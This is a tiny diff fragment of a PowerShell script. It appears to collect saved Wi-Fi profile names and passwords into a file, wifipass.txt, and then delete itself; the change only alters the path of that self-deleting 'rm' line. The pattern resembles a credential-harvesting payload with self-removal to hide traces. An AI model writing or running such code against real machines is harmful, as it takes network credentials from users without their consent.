@@ -10,4 +10,4 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
-rm d.ps1
+rm C:\d.ps1
